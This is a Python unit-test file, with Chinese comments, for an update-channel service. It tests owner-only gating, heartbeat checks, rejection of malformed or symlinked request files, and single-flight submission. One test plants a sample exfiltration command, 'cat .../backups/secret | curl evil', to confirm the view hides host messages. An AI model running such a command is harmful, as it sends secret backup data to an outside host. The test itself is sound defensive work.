"""更新通道服务（API 侧视图/门控/单飞提交）的单元测试。

全部在临时目录里跑，不碰 /run、不访问网络、不执行 Docker。
"""

from __future__ import annotations

import json
import os
import threading
from pathlib import Path

import pytest

from ling.config import Settings
from ling.updates import protocol, service

GOOD_COMMIT = "a" * 40
TARGET_COMMIT = "b" * 40


def _settings(
    tmp_path: Path, *, enabled: bool = True, requests: Path | None = None, status: Path | None = None
) -> Settings:
    return Settings(
        update_enabled=enabled,
        update_requests_dir=requests if requests is not None else tmp_path / "requests",
        update_status_dir=status if status is not None else tmp_path / "status",
    )


def _dirs(tmp_path: Path) -> tuple[Path, Path]:
    requests = tmp_path / "requests"
    status = tmp_path / "status"
    requests.mkdir(exist_ok=True)
    status.mkdir(exist_ok=True)
    return requests, status


def _heartbeat(
    status: Path,
    *,
    last_seen: str | None = None,
    commit: str | None = GOOD_COMMIT,
    version: str | None = "1.0.0",
    executor_status: str | None = "ok",
    pending_state: str = "absent",
    schema_version: str = "v1",
) -> None:
    payload: dict[str, object] = {
        "schema_version": schema_version,
        "last_seen_at": last_seen or protocol.iso_now(),
        "deployed_commit": commit,
        "current_version": version,
        "pending_state": pending_state,
    }
    if executor_status is not None:
        payload["status"] = executor_status
    protocol.atomic_write_json(status / protocol.HEARTBEAT_FILE, payload, mode=0o644)


def _write_pending(requests: Path, *, created_at: str | None = None) -> protocol.UpdateRequest:
    request = protocol.build_request(
        target_tag="v1.2.0",
        target_commit=TARGET_COMMIT,
        current_version="1.0.0",
        current_commit=GOOD_COMMIT,
        created_at=created_at,
    )
    protocol.atomic_write_json(
        requests / protocol.PENDING_FILE, request.to_dict(), mode=0o640
    )
    return request


def test_disabled_wins_over_everything(tmp_path: Path) -> None:
    channel = service.UpdateChannel(_settings(tmp_path, enabled=False))
    assert channel.view(role="owner", current_version="1.0.0", current_commit=None) == {
        "schema_version": "v1",
        "enabled": False,
        "reason": "disabled",
        "executor": {"online": False, "last_seen_at": None},
        "current_job": None,
    }


def test_non_owner_cannot_update(tmp_path: Path) -> None:
    requests, status = _dirs(tmp_path)
    _heartbeat(status)
    channel = service.UpdateChannel(_settings(tmp_path))
    gated = channel.gate(role="member", current_version="1.0.0", current_commit=GOOD_COMMIT)
    assert gated == "not_owner"
    assert channel.view(role="member", current_version="1.0.0", current_commit=GOOD_COMMIT)[
        "reason"
    ] == "not_owner"


def test_missing_channel_dirs_are_unavailable(tmp_path: Path) -> None:
    channel = service.UpdateChannel(_settings(tmp_path))
    assert channel.gate(role="owner", current_version="1.0.0", current_commit=GOOD_COMMIT) == (
        "channel_unavailable"
    )
    state = channel.executor_state()
    assert state.status_available is False
    assert state.requests_available is False


def test_offline_without_heartbeat(tmp_path: Path) -> None:
    _dirs(tmp_path)
    channel = service.UpdateChannel(_settings(tmp_path))
    state = channel.executor_state()
    assert state.online is False
    assert state.current_job is None
    assert channel.gate(role="owner", current_version="1.0.0", current_commit=GOOD_COMMIT) == (
        "executor_offline"
    )


def test_stale_heartbeat_is_offline_but_keeps_real_job(tmp_path: Path) -> None:
    requests, status = _dirs(tmp_path)
    _heartbeat(status, last_seen="2020-01-01T00:00:00Z")
    request = _write_pending(requests)
    protocol.atomic_write_json(
        status / protocol.CURRENT_FILE,
        request.to_job().with_progress(state="running", stage="build").to_dict(),
        mode=0o644,
    )
    channel = service.UpdateChannel(_settings(tmp_path))
    state = channel.executor_state()
    assert state.online is False
    # 心跳过期不能把真实 job 伪装成 failed。
    assert state.current_job is not None
    assert state.current_job.state == "running"
    assert state.current_job.stage == "build"


@pytest.mark.parametrize(
    ("heartbeat_kwargs", "expected"),
    [
        ({"commit": None, "version": "1.0.0"}, "version_drift"),
        ({"commit": "c" * 40, "version": "1.0.0"}, "version_drift"),
        ({"commit": GOOD_COMMIT, "version": "0.9.0"}, "version_drift"),
    ],
)
def test_version_drift_detected(
    tmp_path: Path, heartbeat_kwargs: dict[str, object], expected: str
) -> None:
    _requests, status = _dirs(tmp_path)
    _heartbeat(status, **heartbeat_kwargs)  # type: ignore[arg-type]
    channel = service.UpdateChannel(_settings(tmp_path))
    assert channel.gate(role="owner", current_version="1.0.0", current_commit=GOOD_COMMIT) == (
        expected
    )


def test_installed_commit_unknown_blocks_updates(tmp_path: Path) -> None:
    _requests, status = _dirs(tmp_path)
    _heartbeat(status)
    channel = service.UpdateChannel(_settings(tmp_path))
    assert channel.gate(role="owner", current_version="1.0.0", current_commit=None) == (
        "installed_commit_unknown"
    )
    assert channel.gate(role="owner", current_version="1.0.0", current_commit="abc1234") == (
        "installed_commit_unknown"
    )


def test_healthy_channel_has_no_reason(tmp_path: Path) -> None:
    requests, status = _dirs(tmp_path)
    _heartbeat(status)
    channel = service.UpdateChannel(_settings(tmp_path))
    view = channel.view(role="owner", current_version="1.0.0", current_commit=GOOD_COMMIT)
    assert view["enabled"] is True
    assert view["reason"] is None
    assert view["executor"] == {
        "online": True,
        "last_seen_at": pytest.approx(view["executor"]["last_seen_at"]),
    }
    del requests


def test_pending_shows_queued_and_blocks_new_submission(tmp_path: Path) -> None:
    requests, status = _dirs(tmp_path)
    _heartbeat(status)
    request = _write_pending(requests)
    channel = service.UpdateChannel(_settings(tmp_path))
    view = channel.view(role="owner", current_version="1.0.0", current_commit=GOOD_COMMIT)
    assert view["reason"] == "update_in_progress"
    assert view["current_job"] is not None
    assert view["current_job"]["state"] == "queued"
    assert view["current_job"]["request_id"] == request.request_id
    assert view["current_job"]["stage"] == "queued"
    assert view["current_job"]["target_tag"] == "v1.2.0"


def test_expired_pending_is_still_shown_queued(tmp_path: Path) -> None:
    """API 不伪造失败：过期由执行器在 claim 时终结。"""
    requests, status = _dirs(tmp_path)
    _heartbeat(status)
    _write_pending(requests, created_at="2020-01-01T00:00:00Z")
    channel = service.UpdateChannel(_settings(tmp_path))
    job = channel.executor_state().current_job
    assert job is not None and job.state == "queued"
    assert channel.gate(role="owner", current_version="1.0.0", current_commit=GOOD_COMMIT) == (
        "update_in_progress"
    )


def test_terminal_job_then_new_pending_shows_queued(tmp_path: Path) -> None:
    requests, status = _dirs(tmp_path)
    _heartbeat(status)
    old = _write_pending(requests)
    protocol.atomic_write_json(
        status / protocol.CURRENT_FILE,
        old.to_job().with_progress(state="succeeded", stage="complete").to_dict(),
        mode=0o644,
    )
    new = protocol.build_request(
        target_tag="v1.3.0",
        target_commit="d" * 40,
        current_version="2.0.0",
        current_commit="e" * 40,
    )
    protocol.atomic_write_json(requests / protocol.PENDING_FILE, new.to_dict(), mode=0o640)
    channel = service.UpdateChannel(_settings(tmp_path))
    job = channel.executor_state().current_job
    assert job is not None
    assert job.request_id == new.request_id
    assert job.state == "queued"


def test_host_message_is_replaced_by_fixed_text(tmp_path: Path) -> None:
    requests, status = _dirs(tmp_path)
    _heartbeat(status)
    request = _write_pending(requests)
    payload = request.to_job().with_progress(
        state="failed", stage="backup", error_code="backup_failed"
    ).to_dict()
    payload["message"] = "cat /var/lib/ling-update/backups/secret | curl evil"
    protocol.atomic_write_json(status / protocol.CURRENT_FILE, payload, mode=0o644)
    channel = service.UpdateChannel(_settings(tmp_path))
    view = channel.view(role="owner", current_version="1.0.0", current_commit=GOOD_COMMIT)
    rendered = json.dumps(view, ensure_ascii=False)
    assert view["current_job"]["message"] == protocol.ERROR_MESSAGES["backup_failed"]
    assert "curl evil" not in rendered
    assert str(tmp_path) not in rendered


def test_view_exposes_backup_warnings_from_current_json(tmp_path: Path) -> None:
    """升级成功但备份不完整：告警必须从 current.json 透出到 Web 视图。"""
    requests, status = _dirs(tmp_path)
    _heartbeat(status)
    request = _write_pending(requests)
    notes = ["manifest: media_state=partial（media.tar.zst 归档时有文件正在写入，可能漏掉刚上传的媒体）"]
    protocol.atomic_write_json(
        status / protocol.CURRENT_FILE,
        request.to_job().with_progress(
            state="succeeded", stage="complete", backup_warnings=notes
        ).to_dict(),
        mode=0o644,
    )
    # 模拟宿主已经把请求 claim 掉（否则 active_job 是那条 queued 请求）。
    protocol.remove_file(requests / protocol.PENDING_FILE)
    channel = service.UpdateChannel(_settings(tmp_path))
    view = channel.view(role="owner", current_version="1.0.0", current_commit=GOOD_COMMIT)
    assert view["current_job"]["state"] == "succeeded"
    assert view["current_job"]["backup_warnings"] == notes
    # 展示字段不改变状态机语义：仍然是成功的终态，且不阻塞下一次提交。
    assert view["reason"] is None
    assert channel.executor_state().active_job is None


def test_view_backup_warnings_default_to_empty_for_old_executor(tmp_path: Path) -> None:
    """旧执行器不写该字段：视图给空数组，不得报错、不得改变门禁。"""
    requests, status = _dirs(tmp_path)
    _heartbeat(status)
    request = _write_pending(requests)
    payload = request.to_job().with_progress(state="succeeded", stage="complete").to_dict()
    payload.pop("backup_warnings", None)
    protocol.atomic_write_json(status / protocol.CURRENT_FILE, payload, mode=0o644)
    protocol.remove_file(requests / protocol.PENDING_FILE)
    channel = service.UpdateChannel(_settings(tmp_path))
    view = channel.view(role="owner", current_version="1.0.0", current_commit=GOOD_COMMIT)
    assert view["current_job"]["backup_warnings"] == []
    assert view["reason"] is None
    assert channel.gate(role="owner", current_version="1.0.0", current_commit=GOOD_COMMIT) is None


def test_view_backup_warnings_do_not_bypass_gates(tmp_path: Path) -> None:
    """带告警也不等于“可更新”：needs_manual 仍然挡住提交，角色门禁照旧。"""
    requests, status = _dirs(tmp_path)
    _heartbeat(status, executor_status="manual")
    request = _write_pending(requests)
    protocol.atomic_write_json(
        status / protocol.CURRENT_FILE,
        request.to_job().with_progress(
            state="needs_manual", error_code="verify_failed", backup_warnings=["warn"]
        ).to_dict(),
        mode=0o644,
    )
    channel = service.UpdateChannel(_settings(tmp_path))
    view = channel.view(role="owner", current_version="1.0.0", current_commit=GOOD_COMMIT)
    assert view["current_job"]["backup_warnings"] == ["warn"]
    assert view["reason"] == "manual_required"
    member = channel.view(role="member", current_version="1.0.0", current_commit=GOOD_COMMIT)
    assert member["reason"] == "not_owner"


def test_malformed_status_files_are_ignored(tmp_path: Path) -> None:
    """坏文件不能伪装成“在线且空闲”：不可信的 pending 必须 fail closed。"""
    requests, status = _dirs(tmp_path)
    (status / protocol.HEARTBEAT_FILE).write_text("not json", encoding="utf-8")
    (status / protocol.CURRENT_FILE).write_text("[]", encoding="utf-8")
    (requests / protocol.PENDING_FILE).write_text("{}", encoding="utf-8")
    channel = service.UpdateChannel(_settings(tmp_path))
    state = channel.executor_state()
    assert state.online is False
    assert state.current_job is None
    assert state.active_job is None
    # pending 存在但不可解析：显式标记 + 门禁拒绝，而不是当 idle。
    assert state.pending_state == protocol.PENDING_STATE_INVALID
    assert state.protocol_ok is False
    assert channel.gate(
        role="owner", current_version="1.0.0", current_commit=GOOD_COMMIT
    ) == ("protocol_unsupported")


def test_symlinked_pending_is_invalid_not_absent(tmp_path: Path) -> None:
    requests, status = _dirs(tmp_path)
    _heartbeat(status)
    real = tmp_path / "real-pending.json"
    real.write_text(
        json.dumps(
            protocol.build_request(
                target_tag="v1.2.0",
                target_commit=TARGET_COMMIT,
                current_version="1.0.0",
                current_commit=GOOD_COMMIT,
            ).to_dict()
        ),
        encoding="utf-8",
    )
    (requests / protocol.PENDING_FILE).symlink_to(real)
    channel = service.UpdateChannel(_settings(tmp_path))
    pending = channel.read_pending()
    assert pending.state == protocol.PENDING_STATE_INVALID
    assert pending.request is None
    state = channel.executor_state()
    assert state.current_job is None
    assert state.protocol_ok is False


# ---------------------------------------------------------------- M1 协议状态门禁


def test_heartbeat_without_status_is_protocol_unsupported(tmp_path: Path) -> None:
    """旧执行器心跳没有 status：不能当成在线空闲，必须显式拒绝。"""
    requests, status = _dirs(tmp_path)
    _heartbeat(status, executor_status=None)
    channel = service.UpdateChannel(_settings(tmp_path))
    state = channel.executor_state()
    assert state.online is False
    assert state.protocol_ok is False
    assert channel.gate(
        role="owner", current_version="1.0.0", current_commit=GOOD_COMMIT
    ) == ("protocol_unsupported")


def test_unknown_heartbeat_schema_is_protocol_unsupported(tmp_path: Path) -> None:
    requests, status = _dirs(tmp_path)
    _heartbeat(status, schema_version="v2")
    channel = service.UpdateChannel(_settings(tmp_path))
    assert channel.gate(
        role="owner", current_version="1.0.0", current_commit=GOOD_COMMIT
    ) == ("protocol_unsupported")


def test_manual_heartbeat_blocks_with_manual_required(tmp_path: Path) -> None:
    requests, status = _dirs(tmp_path)
    _heartbeat(status, executor_status="manual")
    channel = service.UpdateChannel(_settings(tmp_path))
    state = channel.executor_state()
    assert state.manual_required is True
    assert state.online is False
    assert channel.gate(
        role="owner", current_version="1.0.0", current_commit=GOOD_COMMIT
    ) == ("manual_required")


def test_invalid_pending_blocks_gate_and_submission(tmp_path: Path) -> None:
    requests, status = _dirs(tmp_path)
    _heartbeat(status, pending_state="invalid")
    (requests / protocol.PENDING_FILE).write_text("{not json", encoding="utf-8")
    channel = service.UpdateChannel(_settings(tmp_path))
    assert channel.gate(
        role="owner", current_version="1.0.0", current_commit=GOOD_COMMIT
    ) == ("protocol_unsupported")
    with pytest.raises(service.UpdateSubmissionError) as info:
        channel.submit(
            protocol.build_request(
                target_tag="v1.2.0",
                target_commit=TARGET_COMMIT,
                current_version="1.0.0",
                current_commit=GOOD_COMMIT,
            )
        )
    assert info.value.detail == "protocol_unsupported"
    # 不可信文件必须原样留在原处等人工处理（不删、不覆盖）。
    assert (requests / protocol.PENDING_FILE).read_text(encoding="utf-8") == "{not json"


def test_submit_refuses_when_heartbeat_is_manual(tmp_path: Path) -> None:
    requests, status = _dirs(tmp_path)
    _heartbeat(status, executor_status="manual")
    channel = service.UpdateChannel(_settings(tmp_path))
    with pytest.raises(service.UpdateSubmissionError) as info:
        channel.submit(
            protocol.build_request(
                target_tag="v1.2.0",
                target_commit=TARGET_COMMIT,
                current_version="1.0.0",
                current_commit=GOOD_COMMIT,
            )
        )
    assert info.value.detail == "manual_required"
    assert not (requests / protocol.PENDING_FILE).exists()


def test_submit_writes_pending_with_private_mode(tmp_path: Path) -> None:
    requests, status = _dirs(tmp_path)
    _heartbeat(status)
    channel = service.UpdateChannel(_settings(tmp_path))
    request = protocol.build_request(
        target_tag="v1.2.0",
        target_commit=TARGET_COMMIT,
        current_version="1.0.0",
        current_commit=GOOD_COMMIT,
    )
    job = channel.submit(request)
    assert job.state == "queued"
    pending_path = requests / protocol.PENDING_FILE
    assert (pending_path.stat().st_mode & 0o777) == 0o640
    stored = protocol.read_json_file(pending_path)
    assert stored is not None
    assert stored["request_id"] == request.request_id
    assert protocol.UpdateRequest.from_dict(stored) == request


def test_submit_is_single_flight_across_threads(tmp_path: Path) -> None:
    requests, status = _dirs(tmp_path)
    _heartbeat(status)
    channel = service.UpdateChannel(_settings(tmp_path))
    barrier = threading.Barrier(4)
    results: list[object] = []

    def worker(index: int) -> None:
        request = protocol.build_request(
            target_tag="v1.2.0",
            target_commit=TARGET_COMMIT,
            current_version="1.0.0",
            current_commit=GOOD_COMMIT,
        )
        barrier.wait()
        try:
            results.append(channel.submit(request))
        except service.UpdateSubmissionError as exc:
            results.append(exc.detail)

    threads = [threading.Thread(target=worker, args=(index,)) for index in range(4)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join(timeout=20)

    assert len(results) == 4
    jobs = [item for item in results if isinstance(item, protocol.UpdateJob)]
    conflicts = [item for item in results if item == "update_in_progress"]
    assert len(jobs) == 1
    assert len(conflicts) == 3
    assert protocol.read_json_file(requests / protocol.PENDING_FILE) is not None


def test_submit_never_overwrites_terminal_leftover_pending(tmp_path: Path) -> None:
    """B1：current 已是终态、pending 还残留同一 id 时，API 不能覆盖它。

    宿主可能正在 compare-and-unlink 这个文件；覆盖会让“宿主持有 A、文件已换成
    B、宿主删掉 B”把新请求吞掉（用户看到 201、执行器在线，却永远不执行）。
    """
    requests, status = _dirs(tmp_path)
    _heartbeat(status)
    leftover = _write_pending(requests)
    protocol.atomic_write_json(
        status / protocol.CURRENT_FILE,
        leftover.to_job()
        .with_progress(state="failed", stage="build", error_code="build_failed")
        .to_dict(),
        mode=0o644,
    )
    channel = service.UpdateChannel(_settings(tmp_path))
    new = protocol.build_request(
        target_tag="v1.3.0",
        target_commit="d" * 40,
        current_version="1.0.0",
        current_commit=GOOD_COMMIT,
    )
    with pytest.raises(service.UpdateSubmissionError) as info:
        channel.submit(new)
    assert info.value.detail == "update_in_progress"
    assert info.value.status_code == 409
    stored = protocol.read_json_file(requests / protocol.PENDING_FILE)
    assert stored is not None and stored["request_id"] == leftover.request_id
    # 残留 pending 期间视图仍显示“进行中”，不会假装空闲。
    view = channel.view(role="owner", current_version="1.0.0", current_commit=GOOD_COMMIT)
    assert view["reason"] == "update_in_progress"


def test_submit_requires_requests_directory(tmp_path: Path) -> None:
    channel = service.UpdateChannel(_settings(tmp_path))
    with pytest.raises(service.UpdateSubmissionError) as info:
        channel.submit(
            protocol.build_request(
                target_tag="v1.2.0",
                target_commit=TARGET_COMMIT,
                current_version="1.0.0",
                current_commit=GOOD_COMMIT,
            )
        )
    assert info.value.detail == "channel_unavailable"
    assert info.value.status_code == 503


def test_readonly_status_dir_does_not_break_reads(tmp_path: Path) -> None:
    requests, status = _dirs(tmp_path)
    _heartbeat(status)
    requests_path = requests
    try:
        os.chmod(status, 0o500)
        channel = service.UpdateChannel(_settings(tmp_path))
        view = channel.view(role="owner", current_version="1.0.0", current_commit=GOOD_COMMIT)
        assert view["executor"]["online"] is True
        # requests 仍然可写：只读 status 不应影响提交通道。
        job = channel.submit(
            protocol.build_request(
                target_tag="v1.2.0",
                target_commit=TARGET_COMMIT,
                current_version="1.0.0",
                current_commit=GOOD_COMMIT,
            )
        )
        assert job.state == "queued"
        assert (requests_path / protocol.PENDING_FILE).exists()
    finally:
        os.chmod(status, 0o700)


def test_evaluate_release_gates(tmp_path: Path) -> None:
    requests, status = _dirs(tmp_path)
    _heartbeat(status)
    channel = service.UpdateChannel(_settings(tmp_path))
    target = service.ReleaseTarget(
        status="ok",
        release_id=7,
        tag="v1.2.0",
        commit=TARGET_COMMIT,
        published_at=None,
        html_url=None,
        stable=True,
        is_newer=True,
    )
    assert channel.evaluate_release(
        target, role="owner", current_version="1.0.0", current_commit=GOOD_COMMIT
    ) == (True, None)
    assert channel.evaluate_release(
        target, role="member", current_version="1.0.0", current_commit=GOOD_COMMIT
    ) == (False, "not_owner")
    older = service.ReleaseTarget(
        status="ok",
        release_id=7,
        tag="v1.2.0",
        commit=TARGET_COMMIT,
        published_at=None,
        html_url=None,
        stable=True,
        is_newer=False,
    )
    assert channel.evaluate_release(
        older, role="owner", current_version="1.0.0", current_commit=GOOD_COMMIT
    ) == (False, "not_newer")
    unverifiable = service.ReleaseTarget(
        status="ok",
        release_id=None,
        tag="v1.2.0",
        commit=None,
        published_at=None,
        html_url=None,
        stable=False,
        is_newer=True,
    )
    assert channel.evaluate_release(
        unverifiable, role="owner", current_version="1.0.0", current_commit=GOOD_COMMIT
    ) == (False, "release_unverifiable")
    unavailable = service.ReleaseTarget(
        status="unavailable",
        release_id=None,
        tag=None,
        commit=None,
        published_at=None,
        html_url=None,
        stable=False,
        is_newer=None,
    )
    assert channel.evaluate_release(
        unavailable, role="owner", current_version="1.0.0", current_commit=GOOD_COMMIT
    ) == (False, "release_unverifiable")
    del requests


def test_needs_manual_blocks_new_submission(tmp_path: Path) -> None:
    """needs_manual 是门禁态：不伪造 failed，也不允许再发起更新。"""
    requests, status = _dirs(tmp_path)
    _heartbeat(status)
    stuck = _write_pending(requests)
    protocol.atomic_write_json(
        status / protocol.CURRENT_FILE,
        stuck.to_job()
        .with_progress(state="needs_manual", stage="verify", error_code="verify_failed")
        .to_dict(),
        mode=0o644,
    )
    channel = service.UpdateChannel(_settings(tmp_path))
    assert channel.gate(role="owner", current_version="1.0.0", current_commit=GOOD_COMMIT) == (
        "update_in_progress"
    )
    view = channel.view(role="owner", current_version="1.0.0", current_commit=GOOD_COMMIT)
    assert view["reason"] == "update_in_progress"
    job = view["current_job"]
    assert job is not None
    assert job["state"] == "needs_manual"
    assert job["request_id"] == stuck.request_id


def test_terminal_failed_job_does_not_block_new_submission(tmp_path: Path) -> None:
    requests, status = _dirs(tmp_path)
    _heartbeat(status)
    done = _write_pending(requests)
    protocol.atomic_write_json(
        status / protocol.CURRENT_FILE,
        done.to_job()
        .with_progress(state="failed", stage="build", error_code="build_failed")
        .to_dict(),
        mode=0o644,
    )
    protocol.remove_file(requests / protocol.PENDING_FILE)
    channel = service.UpdateChannel(_settings(tmp_path))
    assert (
        channel.gate(role="owner", current_version="1.0.0", current_commit=GOOD_COMMIT) is None
    )
